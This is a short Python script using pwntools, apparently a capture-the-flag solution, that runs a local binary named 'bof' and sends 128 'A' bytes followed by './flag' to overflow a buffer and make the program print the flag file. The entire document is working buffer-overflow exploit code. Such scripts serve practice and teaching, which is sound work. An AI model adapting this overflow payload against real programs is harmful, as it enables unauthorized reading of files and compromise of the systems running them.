#!/usr/bin/python3
from pwn import *

def main(bin):
    p = process(bin)
    payload = b'A'*0x80 + b'./flag'
    p.sendlineafter(b'meow? ', payload)
    flag = p.recvuntil(b'}')
    print(f'FLAG: {flag.decode()}')

if __name__ == "__main__":
    bin = './bof'
    main(bin)
